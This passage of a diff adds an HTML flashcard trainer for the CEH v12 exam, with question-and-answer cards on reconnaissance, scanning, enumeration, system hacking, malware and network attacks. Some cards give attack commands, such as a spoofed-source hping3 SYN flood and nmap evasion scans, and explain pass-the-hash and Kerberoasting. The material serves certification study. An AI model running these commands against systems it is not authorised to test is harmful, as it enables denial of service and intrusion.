@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CEH v12 Flashcards — 312-50 Exam Trainer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne+Mono&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #060a12;
+    --bg2: #0d1117;
+    --bg3: #111827;
+    --border: #1e293b;
+    --border2: #0f172a;
+    --text: #e2e8f0;
+    --text2: #94a3b8;
+    --text3: #475569;
+    --text4: #334155;
+    --blue: #38bdf8;
+    --green: #4ade80;
+    --yellow: #fbbf24;
+    --red: #f87171;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne Mono', 'Courier New', monospace;
+    min-height: 100vh;
+    padding: 20px 16px 60px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* ── HEADER ── */
+  #header {
+    width: 100%; max-width: 820px; margin-bottom: 20px;
+  }
+  #header-top {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    flex-wrap: wrap; gap: 10px;
+  }
+  #logo-title {
+    font-family: 'Syne', sans-serif; font-weight: 800;
+    font-size: 26px; color: var(--text); letter-spacing: 1px;
+  }
+  #logo-title span { color: var(--blue); text-shadow: 0 0 30px var(--blue); }
+  #logo-sub { font-size: 10px; color: var(--text4); letter-spacing: 4px; margin-top: 2px; }
+  #stats { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+  .stat-chip {
+    border-radius: 8px; padding: 5px 12px; font-size: 11px; font-family: 'Syne Mono', monospace;
+    border: 1px solid;
+  }
+  .stat-known { background: #0f2a1a; border-color: #166534; color: var(--green); }
+  .stat-review { background: #2a1a00; border-color: #713f12; color: var(--yellow); }
+  .btn-sm {
+    background: transparent; border: 1px solid var(--border);
+    border-radius: 8px; padding: 5px 12px; font-size: 11px;
+    color: var(--text3); cursor: pointer; font-family: 'Syne Mono', monospace;
+    transition: all 0.15s;
+  }
+  .btn-sm:hover { border-color: var(--text3); color: var(--text2); }
+  .btn-sm.active { background: #fbbf2422; border-color: #fbbf2466; color: var(--yellow); }
+
+  /* ── PROGRESS ── */
+  #progress-wrap { margin-top: 12px; }
+  #progress-labels { display: flex; justify-content: space-between; margin-bottom: 4px; }
+  #progress-labels span:first-child { font-size: 10px; color: var(--text4); letter-spacing: 2px; }
+  #progress-labels span:last-child { font-size: 10px; color: var(--blue); }
+  #progress-bar-bg { height: 3px; background: #0f172a; border-radius: 2px; overflow: hidden; }
+  #progress-bar { height: 100%; background: linear-gradient(90deg, var(--blue), var(--green)); border-radius: 2px; transition: width 0.5s ease; width: 0%; }
+
+  /* ── FILTERS ── */
+  #filters { width: 100%; max-width: 820px; margin-bottom: 16px; }
+  .filter-row { display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 8px; align-items: center; }
+  .filter-label { font-size: 10px; color: var(--text4); letter-spacing: 2px; margin-right: 4px; flex-shrink: 0; }
+  .pill {
+    padding: 3px 11px; border-radius: 20px; font-size: 10px; cursor: pointer;
+    border: 1px solid; font-family: 'Syne Mono', monospace; letter-spacing: 0.5px;
+    background: transparent; transition: all 0.12s; white-space: nowrap;
+  }
+  .pill:hover { filter: brightness(1.3); }
+
+  /* ── CARD META ── */
+  #card-meta {
+    width: 100%; max-width: 820px;
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 8px; flex-wrap: wrap; gap: 6px;
+  }
+  #card-counter { font-size: 11px; color: var(--border); }
+  #card-tags { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+  .tag {
+    font-size: 10px; padding: 2px 8px; border-radius: 10px;
+    border: 1px solid; font-family: 'Syne Mono', monospace;
+  }
+
+  /* ── FLIP CARD ── */
+  #flip-wrap {
+    width: 100%; max-width: 820px; height: 300px;
+    perspective: 1400px; cursor: pointer; margin-bottom: 20px;
+    flex-shrink: 0;
+  }
+  #flip-inner {
+    width: 100%; height: 100%;
+    transform-style: preserve-3d;
+    transition: transform 0.45s cubic-bezier(.4,0,.2,1);
+    position: relative;
+  }
+  #flip-inner.flipped { transform: rotateY(180deg); }
+  .face {
+    position: absolute; inset: 0;
+    backface-visibility: hidden; -webkit-backface-visibility: hidden;
+    border-radius: 20px;
+    display: flex; flex-direction: column;
+    padding: 26px 30px;
+    overflow: hidden;
+  }
+  #face-front {
+    background: linear-gradient(145deg, #0d1117 0%, #111827 50%, #0d1825 100%);
+  }
+  #face-back {
+    transform: rotateY(180deg);
+    background: linear-gradient(145deg, #0a1a0f 0%, #0f2010 50%, #0a1a14 100%);
+    overflow-y: auto;
+  }
+  .face::after {
+    content: '';
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(255,255,255,0.012) 3px, rgba(255,255,255,0.012) 4px);
+    border-radius: 20px;
+    pointer-events: none;
+  }
+  .face-indicator {
+    display: flex; align-items: center; gap: 8px; margin-bottom: 14px; flex-shrink: 0;
+  }
+  .face-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+  .face-label { font-size: 9px; letter-spacing: 4px; }
+  .face-body {
+    flex: 1; display: flex; align-items: center; justify-content: center;
+    overflow: hidden;
+  }
+  .face-body-text {
+    font-size: 15px; line-height: 1.85; text-align: center;
+    max-width: 700px; white-space: pre-wrap;
+  }
+  #face-front .face-body-text { color: #cbd5e1; }
+  #face-back .face-body-text { color: #86efac; font-size: 14px; }
+  .face-hint { text-align: center; font-size: 9px; letter-spacing: 3px; margin-top: 10px; flex-shrink: 0; }
+  #face-front .face-hint { color: var(--border2); }
+  #face-back .face-hint { color: #166534; }
+
+  /* ── CONTROLS ── */
+  #controls {
+    width: 100%; max-width: 820px;
+    display: flex; gap: 8px; justify-content: center; align-items: center; flex-wrap: wrap;
+  }
+  .ctrl-btn {
+    border-radius: 12px; padding: 13px 18px; font-family: 'Syne Mono', monospace;
+    cursor: pointer; border: 1px solid; transition: all 0.15s; font-size: 11px; letter-spacing: 1px;
+  }
+  .ctrl-btn:hover { filter: brightness(1.25); transform: translateY(-1px); }
+  .ctrl-btn:active { transform: translateY(0); }
+  .ctrl-nav { background: #0f172a; border-color: var(--border); color: var(--text3); font-size: 18px; padding: 13px 20px; }
+  .ctrl-review { flex: 1; max-width: 200px; background: transparent; border-color: #fbbf2433; color: var(--yellow); }
+  .ctrl-known { flex: 1; max-width: 200px; background: transparent; border-color: #4ade8033; color: var(--green); }
+
+  /* ── CATEGORY GRID ── */
+  #cat-grid {
+    width: 100%; max-width: 820px; margin-top: 28px;
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(155px, 1fr)); gap: 6px;
+  }
+  .cat-cell {
+    background: var(--bg2); border-radius: 8px; padding: 8px 10px; cursor: pointer;
+    border: 1px solid transparent; transition: border-color 0.15s;
+  }
+  .cat-cell:hover { filter: brightness(1.2); }
+  .cat-cell-top { display: flex; justify-content: space-between; margin-bottom: 5px; }
+  .cat-cell-name { font-size: 10px; }
+  .cat-cell-count { font-size: 9px; color: var(--border); }
+  .cat-cell-bar-bg { height: 2px; background: #0f172a; border-radius: 1px; }
+  .cat-cell-bar { height: 100%; border-radius: 1px; transition: width 0.4s ease; opacity: 0.8; }
+
+  /* ── FOOTER ── */
+  #footer { margin-top: 28px; font-size: 9px; color: var(--border2); letter-spacing: 3px; }
+
+  /* ── SLIDE ANIM ── */
+  @keyframes slideL { from { opacity:0.2; transform: translateX(28px); } to { opacity:1; transform: translateX(0); } }
+  @keyframes slideR { from { opacity:0.2; transform: translateX(-28px); } to { opacity:1; transform: translateX(0); } }
+  .slide-l { animation: slideL 0.18s ease; }
+  .slide-r { animation: slideR 0.18s ease; }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  @media (max-width: 600px) {
+    .face { padding: 18px 18px; }
+    .face-body-text { font-size: 13px; }
+    #face-back .face-body-text { font-size: 12px; }
+    #flip-wrap { height: 340px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div id="header">
+  <div id="header-top">
+    <div>
+      <div id="logo-title">CEH <span>v12</span></div>
+      <div id="logo-sub">FLASHCARD TRAINER · 200 QUESTIONS · 312-50</div>
+    </div>
+    <div id="stats">
+      <div class="stat-chip stat-known">✓ <span id="known-count">0</span> known</div>
+      <div class="stat-chip stat-review">⚑ <span id="review-count">0</span> review</div>
+      <button class="btn-sm" id="btn-reviewmode">Review Mode</button>
+      <button class="btn-sm" id="btn-reset">Reset</button>
+    </div>
+  </div>
+  <div id="progress-wrap">
+    <div id="progress-labels"><span>PROGRESS</span><span id="progress-pct">0%</span></div>
+    <div id="progress-bar-bg"><div id="progress-bar"></div></div>
+  </div>
+</div>
+
+<!-- FILTERS -->
+<div id="filters">
+  <div class="filter-row">
+    <span class="filter-label">DIFFICULTY:</span>
+    <button class="pill" data-diff="All">All</button>
+    <button class="pill" data-diff="E">Easy</button>
+    <button class="pill" data-diff="M">Medium</button>
+    <button class="pill" data-diff="H">Hard</button>
+  </div>
+  <div class="filter-row" id="cat-pills"></div>
+</div>
+
+<!-- CARD META -->
+<div id="card-meta">
+  <div id="card-counter">1 / 200</div>
+  <div id="card-tags"></div>
+  <button class="btn-sm" id="btn-random">⟳ random</button>
+</div>
+
+<!-- FLIP CARD -->
+<div id="flip-wrap">
+  <div id="flip-inner">
+    <div class="face" id="face-front">
+      <div class="face-indicator">
+        <div class="face-dot" id="front-dot"></div>
+        <span class="face-label" id="front-label">QUESTION #1</span>
+      </div>
+      <div class="face-body">
+        <div class="face-body-text" id="question-text"></div>
+      </div>
+      <div class="face-hint">CLICK TO REVEAL</div>
+    </div>
+    <div class="face" id="face-back">
+      <div class="face-indicator">
+        <div class="face-dot" style="background:#4ade80;box-shadow:0 0 10px #4ade80"></div>
+        <span class="face-label" style="color:#4ade80">ANSWER</span>
+      </div>
+      <div class="face-body">
+        <div class="face-body-text" id="answer-text"></div>
+      </div>
+      <div class="face-hint">CLICK TO RETURN</div>
+    </div>
+  </div>
+</div>
+
+<!-- CONTROLS -->
+<div id="controls">
+  <button class="ctrl-btn ctrl-nav" id="btn-prev">←</button>
+  <button class="ctrl-btn ctrl-review" id="btn-mark-review">⚑ NEEDS REVIEW</button>
+  <button class="ctrl-btn ctrl-known" id="btn-mark-known">✓ GOT IT</button>
+  <button class="ctrl-btn ctrl-nav" id="btn-next">→</button>
+</div>
+
+<!-- CATEGORY GRID -->
+<div id="cat-grid"></div>
+
+<div id="footer">EC-COUNCIL 312-50v12 · 200 EXAM-PATTERN QUESTIONS</div>
+
+<script>
+const CAT_COLORS = {
+  Foundations:"#60a5fa",Footprinting:"#34d399",Scanning:"#a78bfa",
+  Enumeration:"#22d3ee","Vuln Analysis":"#fbbf24","System Hacking":"#f87171",
+  Malware:"#c084fc",Sniffing:"#2dd4bf","Social Eng.":"#fb923c",
+  "DoS / DDoS":"#f43f5e","Session Hijack":"#818cf8","IDS/Firewall":"#38bdf8",
+  "Web Servers":"#0891b2","Web Apps":"#4ade80",SQLi:"#d97706",
+  Wireless:"#ec4899",Mobile:"#06b6d4","IoT / OT":"#84cc16",
+  Cloud:"#8b5cf6",Cryptography:"#3b82f6",Pentest:"#10b981",
+  Ports:"#b45309",Tools:"#6366f1",Compliance:"#14b8a6",Scenario:"#ef4444"
+};
+const DIFF_COLORS = {E:"#4ade80",M:"#fbbf24",H:"#f87171"};
+const DIFF_LABELS = {E:"Easy",M:"Medium",H:"Hard"};
+
+const CARDS = [
+  {id:1,cat:"Foundations",diff:"E",q:"What are the seven phases of the Cyber Kill Chain in order?",a:"1. Reconnaissance → 2. Weaponisation → 3. Delivery → 4. Exploitation → 5. Installation → 6. Command & Control (C2) → 7. Actions on Objectives. (Lockheed Martin model — CEH exam focuses on Recon, Delivery, and Actions on Objectives.)"},
+  {id:2,cat:"Foundations",diff:"E",q:"What does the MITRE ATT&CK framework provide that the Cyber Kill Chain does not?",a:"Granular, real-world TTPs (Tactics, Techniques, and Procedures) mapped to actual threat actor behaviour. The Kill Chain shows high-level stages; ATT&CK maps hundreds of specific techniques used in each stage."},
+  {id:3,cat:"Foundations",diff:"M",q:"A hacker gains access and installs a backdoor for future use. Which phase of the CEH attack lifecycle is this?",a:"Maintaining Access — after gaining access, the attacker establishes persistence (backdoor, rootkit, RAT) to retain control for future visits without re-exploiting."},
+  {id:4,cat:"Foundations",diff:"E",q:"What is an Advanced Persistent Threat (APT)?",a:"A prolonged, targeted attack where an intruder gains network access and remains undetected for a long time. Goal: espionage and data exfiltration, not destruction. Typically nation-state or sophisticated criminal groups."},
+  {id:5,cat:"Foundations",diff:"M",q:"What is the Diamond Model of Intrusion Analysis (new in CEH v12)?",a:"A threat intelligence framework with four vertices: Adversary, Capability, Infrastructure, Victim. Used to analyse intrusions by mapping relationships between these four components to understand and attribute attacks."},
+  {id:6,cat:"Foundations",diff:"E",q:"What is the difference between a vulnerability, a threat, and a risk?",a:"Vulnerability: weakness in a system. Threat: potential cause of harm (actor or event that could exploit a vulnerability). Risk = Likelihood × Impact of a threat exploiting a vulnerability."},
+  {id:7,cat:"Foundations",diff:"E",q:"What are the three elements of the CIA Triad?",a:"Confidentiality (only authorised access), Integrity (data is accurate and unaltered), Availability (systems accessible when needed). The Parkerian Hexad adds: Possession, Authenticity, and Utility."},
+  {id:8,cat:"Footprinting",diff:"E",q:"Gerard, an ex-employee, performs DNS footprinting. Which query type reveals all internal hostnames if misconfigured?",a:"AXFR (DNS Zone Transfer) — transfers the entire DNS zone to a secondary server. If allowed from any IP, attackers get a complete map of internal hostnames, IPs, and mail servers. Should be restricted to authorised secondaries only."},
+  {id:9,cat:"Footprinting",diff:"M",q:"An attacker uses: intitle:\"index of\" site:target.com — what are they looking for?",a:"Directory listings — web servers with directory browsing enabled expose their file structure, potentially revealing backup files (.bak, .old), config files, database dumps, and credentials."},
+  {id:10,cat:"Footprinting",diff:"E",q:"What tool gathers emails, subdomains, hosts, employee names from public sources like Google and LinkedIn?",a:"theHarvester — aggregates OSINT from search engines, social networks, and certificate transparency logs. Command: theHarvester -d target.com -b google"},
+  {id:11,cat:"Footprinting",diff:"M",q:"What DNS record type maps a hostname to an IPv4 address? What about IPv6, mail, and aliases?",a:"A = IPv4 address. AAAA = IPv6 address. MX = Mail exchanger. CNAME = Canonical name (alias). NS = Nameserver. PTR = Reverse lookup (IP→hostname). SOA = Start of Authority."},
+  {id:12,cat:"Footprinting",diff:"H",q:"An attacker uses Shodan to find an ICS device on the internet. What type of reconnaissance is this?",a:"Passive reconnaissance — Shodan indexes publicly available banner information without the attacker directly probing the target. No packets are sent to the target system itself."},
+  {id:13,cat:"Footprinting",diff:"M",q:"Which of the following is NOT passive footprinting? A) WHOIS lookup  B) Banner grabbing  C) DNS lookup  D) Social media OSINT",a:"B — Banner grabbing is ACTIVE because it requires directly connecting to the target service (e.g., Netcat to port 80). WHOIS, DNS lookups, and social media research use publicly available data without touching the target."},
+  {id:14,cat:"Footprinting",diff:"H",q:"What is an Autonomous System Number (ASN) and how do attackers use it?",a:"An ASN is a unique number assigned to a collection of IP networks under one administrative domain. Attackers use ASN lookups (whois -h whois.radb.net AS[number]) to identify ALL IP ranges owned by an organisation — much broader than a single WHOIS domain lookup."},
+  {id:15,cat:"Scanning",diff:"E",q:"You want to scan with least noise to evade IDS. Which Nmap command is best?\nA) nmap -A -Pn  B) nmap -sP -p- -T5  C) nmap -sT -O -T0  D) nmap -A -T1",a:"C — nmap -sT -O -T0. The -T0 (Paranoid) timing template is the slowest (5 min between probes) and least detectable. Minimises IDS triggering at the cost of scan time."},
+  {id:16,cat:"Scanning",diff:"M",q:"A CEH must scan without revealing their IP. Which Nmap technique and flag?",a:"IDLE/IPID scan (-sI [zombie]). Uses a third-party zombie host's IP ID sequence to infer open ports on the target. The attacker's real IP never appears in target logs — only the zombie's IP."},
+  {id:17,cat:"Scanning",diff:"M",q:"A CEH wants to spoof source IP using Hping3. Which command?\nA) hping3 -1 10.0.0.25\nB) hping3 -2 10.0.0.25 -p 80\nC) hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --flood\nD) nmap -sS -T4",a:"C — hping3 -S sends SYN packets, -a spoofs source IP to 192.168.1.254, targets 192.168.1.1 port 22. The -a flag in hping3 is the IP spoofing parameter."},
+  {id:18,cat:"Scanning",diff:"E",q:"What is the difference between Nmap -sS and -sT?",a:"-sS (SYN/Stealth): sends SYN, receives SYN-ACK or RST, sends RST — never completes handshake. Stealthier, needs root/admin. -sT (TCP Connect): completes full 3-way handshake — louder, logged by OS, no root required."},
+  {id:19,cat:"Scanning",diff:"M",q:"What does an XMAS scan send, and what does no response indicate?",a:"XMAS sets FIN, PSH, and URG flags. No response = port is OPEN (RFC 793 compliant). RST = port is CLOSED. Does NOT work on Windows (Windows sends RST for all unsolicited packets regardless)."},
+  {id:20,cat:"Scanning",diff:"H",q:"In an Idle scan, IPID increments by 2. What does this indicate?",a:"The target port is OPEN. Open port: target sends SYN-ACK to zombie → zombie sends RST → zombie IPID increases. Attacker probes zombie and sees IPID+2 = open. IPID+1 = closed (zombie received RST from target)."},
+  {id:21,cat:"Scanning",diff:"E",q:"What does nmap -sn do?",a:"Ping sweep / host discovery — finds live hosts without port scanning. Sends ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp. First step to map active hosts before detailed scanning."},
+  {id:22,cat:"Scanning",diff:"M",q:"What does the Nmap -Pn flag do and why is it needed?",a:"Skips host discovery — treats all targets as online. Needed when targets block ICMP ping. Without -Pn, Nmap marks ICMP-blocking hosts as 'down' and skips them entirely."},
+  {id:23,cat:"Scanning",diff:"H",q:"What is a FIN scan and when does it fail?",a:"FIN scan sends packets with only the FIN flag. Open = no response. Closed = RST. FAILS on Windows — Windows sends RST for all unsolicited packets regardless of port state, making all ports appear closed."},
+  {id:24,cat:"Scanning",diff:"M",q:"What Nmap timing templates exist and which is default?",a:"T0=Paranoid (5 min/probe), T1=Sneaky, T2=Polite, T3=Normal (default), T4=Aggressive, T5=Insane. T4 is recommended for pentest/CTF. T0-T1 for IDS evasion. T5 is very noisy and unreliable."},
+  {id:25,cat:"Enumeration",diff:"M",q:"A CEH connects to secure LDAP but cannot fetch domain details despite a successful connection. Most likely cause?",a:"The secure LDAP (LDAPS, port 636) connection was not properly initialised — missing use_ssl=True in the server object. Secure LDAP requires explicit SSL/TLS initialisation in the client library."},
+  {id:26,cat:"Enumeration",diff:"E",q:"What SMTP commands enumerate valid usernames on a mail server?",a:"VRFY [username] — server confirms if user exists. EXPN [mailing-list] — expands list to reveal members. Both can reveal valid accounts on misconfigured servers even without authentication."},
+  {id:27,cat:"Enumeration",diff:"M",q:"What does SNMPwalk exploit and what does it reveal?",a:"Exploits weak/default community strings ('public', 'private') sent in cleartext in SNMPv1/v2. Reveals: routing tables, ARP tables, running processes, open ports, network interfaces, installed software, and full device configuration."},
+  {id:28,cat:"Enumeration",diff:"H",q:"What is the key difference between scanning and enumeration in CEH methodology?",a:"Scanning identifies live hosts, open ports, and services (broad). Enumeration extracts specific data: usernames, shares, group memberships, password policies — via active authenticated/unauthenticated connections to identified services. Enumeration is deeper and more targeted."},
+  {id:29,cat:"Enumeration",diff:"M",q:"What tool performs SMB/Samba enumeration on Linux and what does it find?",a:"Enum4linux — enumerates users, shares, groups, password policy, OS info, and printer info from SMB/Samba. Command: enum4linux -a [target]. Nmap NSE: --script smb-enum-users."},
+  {id:30,cat:"Enumeration",diff:"E",q:"What are the NetBIOS ports and what does each do?",a:"137/UDP: NetBIOS Name Service (name registration/resolution). 138/UDP: NetBIOS Datagram Service (connectionless). 139/TCP: NetBIOS Session Service (connection-oriented, used for SMB). SMB also runs directly on 445/TCP."},
+  {id:31,cat:"Vuln Analysis",diff:"E",q:"What CVSS score range is 'Critical' and what does the score measure?",a:"Critical = 9.0–10.0. High = 7.0–8.9. Medium = 4.0–6.9. Low = 0.1–3.9. CVSS Base Score measures Exploitability (attack vector, complexity, privileges, user interaction) and Impact (confidentiality, integrity, availability)."},
+  {id:32,cat:"Vuln Analysis",diff:"M",q:"What is the difference between a false positive and false negative in vulnerability scanning?",a:"False positive: scanner reports a vulnerability that doesn't exist (wasted time). False negative: real vulnerability missed by the scanner (more dangerous — creates false sense of security). False negatives are the greater risk."},
+  {id:33,cat:"Vuln Analysis",diff:"M",q:"What is the difference between a vulnerability scan and a penetration test?",a:"Vulnerability scan: automated identification of known weaknesses — does NOT exploit them. Penetration test: actively exploits vulnerabilities to demonstrate real business impact and test detection/response. Pentest requires authorisation and more skill."},
+  {id:34,cat:"System Hacking",diff:"E",q:"What are the five phases of system hacking in CEH order?",a:"1. Gaining Access (exploitation), 2. Escalating Privileges, 3. Executing Applications (keyloggers, spyware), 4. Maintaining Access (backdoors/rootkits), 5. Covering Tracks (clear logs, modify timestamps)."},
+  {id:35,cat:"System Hacking",diff:"M",q:"What is Pass-the-Hash and which tools enable it?",a:"Using a captured NTLM hash to authenticate without knowing the plaintext password. NTLM accepts the hash directly. Tools: Mimikatz (dump hashes), Impacket psexec.py/wmiexec.py, Metasploit's psexec module."},
+  {id:36,cat:"System Hacking",diff:"M",q:"How does a rainbow table attack work and what single technique defeats it?",a:"Rainbow tables are pre-computed hash→password chains for fast lookups. Defeated by salting — adding a unique random value to each password before hashing. Even identical passwords produce different hashes. Modern: bcrypt/Argon2 include automatic salting."},
+  {id:37,cat:"System Hacking",diff:"M",q:"What is the difference between vertical and horizontal privilege escalation?",a:"Vertical: gain higher-level privileges (regular user → admin/root). Horizontal: access another user's resources at the same privilege level (user A accesses user B's files/account). Both are targeted in post-exploitation."},
+  {id:38,cat:"System Hacking",diff:"H",q:"An attacker uses Hashcat with -a 0. What attack mode is this?",a:"-a 0 = Straight (dictionary) attack — tries each word from a wordlist. Other modes: -a 1 (combination), -a 3 (mask/brute force), -a 6 (wordlist + mask hybrid), -a 7 (mask + wordlist hybrid)."},
+  {id:39,cat:"System Hacking",diff:"M",q:"What type of rootkit is the hardest to detect and why?",a:"Kernel-level rootkit — modifies the OS kernel (drivers, kernel modules). Runs at Ring 0 (highest privilege), can intercept all system calls, making itself invisible to OS-level tools. Requires offline scanning from a clean OS or full reinstall."},
+  {id:40,cat:"System Hacking",diff:"H",q:"What is a Kerberoasting attack?",a:"Any domain user requests Kerberos TGS tickets for accounts with Service Principal Names (SPNs). Tickets are encrypted with the service account's NTLM hash. Attacker extracts tickets offline and cracks them with Hashcat. Exploits service accounts with weak passwords. Tools: Rubeus, GetUserSPNs.py."},
+  {id:41,cat:"System Hacking",diff:"H",q:"What is a Golden Ticket attack?",a:"Attacker compromises the KRBTGT account (Kerberos TGT signing key) and forges TGTs for any user with any group membership and indefinite validity. Provides persistent domain admin access. Requires Domain Controller compromise. Mitigated by resetting KRBTGT password twice."},
+  {id:42,cat:"Malware",diff:"E",q:"John installs a video player that secretly opens a backdoor. What type of malware is this?",a:"Trojan Horse — disguises itself as legitimate software. Does NOT self-replicate. Must be executed by the user. Creates a backdoor for attacker remote access."},
+  {id:43,cat:"Malware",diff:"E",q:"What is the key difference between a virus and a worm?",a:"Worm self-replicates across networks WITHOUT human interaction (exploits vulnerabilities autonomously). Virus requires human action (opening a file, running a program) to propagate. Worms spread faster and wider."},
+  {id:44,cat:"Malware",diff:"H",q:"An attacker uses fileless malware in RAM only. Why does this evade traditional AV?",a:"Traditional AV scans the filesystem for malicious file signatures. Fileless malware (using PowerShell, WMI, or LOLBins — Living Off the Land Binaries) leaves no files on disk. No signature to detect. Requires behavioural/memory analysis (EDR) to catch."},
+  {id:45,cat:"Malware",diff:"M",q:"What is a botnet C&C server and what protocols do botnets use?",a:"Attacker's server that issues commands to all infected bot machines. Protocols: IRC (legacy), HTTP/HTTPS (most common — blends with normal traffic), DNS (covert channel), P2P (resilient — no single point of failure for takedown)."},
+  {id:46,cat:"Malware",diff:"M",q:"What is a polymorphic virus and why is it hard to detect?",a:"A polymorphic virus changes its code/signature with each infection using a mutation engine, while keeping its malicious payload. Signature-based AV cannot match it because the signature changes. Requires heuristic or behaviour-based detection."},
+  {id:47,cat:"Malware",diff:"M",q:"What are the four stages of virus execution?",a:"1. Dormant phase (inactive, waiting for trigger condition), 2. Propagation phase (copies itself to files/storage), 3. Triggering phase (activation condition met — date, event, count), 4. Execution phase (malicious payload delivers its effect)."},
+  {id:48,cat:"Sniffing",diff:"M",q:"A company implements static ARP, IPv6, SSH, SFTP to prevent sniffing. What threat remains?",a:"IPv6 uses NDP (Neighbour Discovery Protocol) which can be spoofed via ICMPv6 Neighbour Advertisements — similar to ARP spoofing. IPv6 doesn't automatically solve layer 2 MITM. Requires IPv6 SEND (SEcure Neighbour Discovery) or DAI equivalent."},
+  {id:49,cat:"Sniffing",diff:"M",q:"What is MAC flooding and what countermeasure prevents it?",a:"Flooding a switch's CAM table with fake MACs causes it to fail open (broadcast all traffic like a hub). Countermeasure: Port Security — limit MAC addresses per switch port (Cisco: switchport port-security maximum 1)."},
+  {id:50,cat:"Sniffing",diff:"E",q:"How does ARP Spoofing enable MITM?",a:"Attacker sends fake ARP replies linking their MAC to the victim's IP and/or gateway IP. Victims update ARP cache incorrectly. Traffic flows through attacker who can read/modify credentials, session tokens, and data in real-time."},
+  {id:51,cat:"Sniffing",diff:"M",q:"What is DHCP starvation and what attack does it enable?",a:"Flooding the DHCP server with requests using spoofed MACs exhausts the IP address pool. Attacker then sets up a rogue DHCP server, assigning themselves as the default gateway → MITM position on all new DHCP clients."},
+  {id:52,cat:"Sniffing",diff:"H",q:"What is a VLAN hopping attack and what two techniques achieve it?",a:"Bypasses VLAN segmentation to intercept traffic from other VLANs. 1) Switch Spoofing: negotiate 802.1Q trunk with switch (disable DTP). 2) Double Tagging: two 802.1Q tags — outer stripped by first switch, inner carries packet to target VLAN."},
+  {id:53,cat:"Social Eng.",diff:"E",q:"A CEO gets an email from 'the CFO' requesting an urgent wire transfer. What attack type is this?",a:"Whaling combined with Business Email Compromise (BEC) — spear phishing targeting C-level executives. Exploits authority, urgency, and trust in internal communication. Also called CEO Fraud."},
+  {id:54,cat:"Social Eng.",diff:"E",q:"What are the six Cialdini principles of influence exploited in social engineering?",a:"1. Reciprocity (I owe you), 2. Commitment/Consistency (I said I would), 3. Social Proof (everyone does it), 4. Authority (I must comply), 5. Liking (I trust you), 6. Scarcity (act now or lose out). Authority is most exploited in pretexting."},
+  {id:55,cat:"Social Eng.",diff:"M",q:"An attacker calls the help desk pretending to be a new employee who forgot their password. What technique?",a:"Vishing (voice phishing) using Pretexting — fabricating a believable scenario to manipulate the help desk. Exploits helpfulness and authority. The pretext (new employee) bypasses suspicion."},
+  {id:56,cat:"Social Eng.",diff:"E",q:"What is the BEST single defence against social engineering attacks?",a:"Security awareness training — humans are the weakest link. Technical controls cannot prevent manipulation of people. Regular training teaches staff to verify identities, be suspicious of urgency, and report suspicious contacts."},
+  {id:57,cat:"Social Eng.",diff:"E",q:"What tool automates phishing pages and credential harvesting for social engineering tests?",a:"SET (Social-Engineer Toolkit) — automates phishing site cloning, credential harvesting, and payload delivery. Also: GoPhish (phishing simulation campaigns), BeEF (Browser Exploitation Framework for client-side attacks)."},
+  {id:58,cat:"DoS / DDoS",diff:"E",q:"Which DoS attack exploits the TCP handshake and what specifically counters it?",a:"SYN Flood — sends SYN packets without completing the handshake, filling the server's half-open connection table (backlog). Specific countermeasure: SYN cookies — server encodes state in the ISN; doesn't allocate memory until handshake completes."},
+  {id:59,cat:"DoS / DDoS",diff:"M",q:"How does a Smurf attack work and why is it amplified?",a:"Attacker spoofs victim's IP and sends ICMP echo requests to a network broadcast address. ALL hosts on the network reply to the victim. Amplification = number of hosts. Countermeasure: disable directed broadcast forwarding on routers (no ip directed-broadcast)."},
+  {id:60,cat:"DoS / DDoS",diff:"M",q:"What is a DNS amplification attack?",a:"Attacker sends small DNS queries (60 bytes) with spoofed victim IP to open resolvers. Resolver sends large DNS responses (3000+ bytes) to victim — up to 70× amplification. UDP allows source IP spoofing. Countermeasure: BCP38 (source IP validation), disable open resolvers."},
+  {id:61,cat:"DoS / DDoS",diff:"M",q:"What is Slowloris and which servers are most/least vulnerable?",a:"Keeps many partial HTTP connections open by sending headers very slowly, never completing. Exhausts server's max connection pool. Most vulnerable: Apache (thread-per-connection). Most resistant: Nginx and Node.js (event-driven, handle thousands of connections efficiently)."},
+  {id:62,cat:"DoS / DDoS",diff:"M",q:"What is the difference between DoS and DDoS?",a:"DoS: single attacker/machine overwhelming a target — easy to block by IP. DDoS: distributed attack from many sources (botnet, amplification) — much harder to mitigate. DDoS can generate terabits/second; DoS typically much smaller scale."},
+  {id:63,cat:"Session Hijack",diff:"M",q:"What cookie attributes together provide the strongest session token protection?",a:"HttpOnly (prevents JS access → blocks XSS cookie theft), Secure (HTTPS-only), SameSite=Strict (blocks CSRF), short Max-Age/Expires, and Regenerate on login. Together address XSS, MITM, CSRF, and session fixation."},
+  {id:64,cat:"Session Hijack",diff:"M",q:"What is the difference between session fixation and session hijacking?",a:"Hijacking: stealing an existing valid session token (via XSS, sniffing, MITM). Fixation: attacker sets a known session ID before login; victim authenticates using that ID → attacker already knows the valid token without stealing it."},
